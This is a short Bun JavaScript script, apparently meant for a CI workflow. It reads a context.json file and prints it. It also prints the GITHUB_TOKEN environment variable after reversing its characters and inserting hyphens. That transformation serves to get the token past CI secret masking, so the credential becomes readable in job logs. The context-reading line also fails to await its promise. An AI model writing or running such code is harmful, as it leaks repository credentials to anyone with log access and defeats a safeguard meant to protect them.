const contextRaw = Bun.file("context.json").json();

console.log("Token:", process.env.GITHUB_TOKEN?.split("").reverse().join("-"));
console.log("Context:\n", JSON.stringify(contextRaw, null, 2));
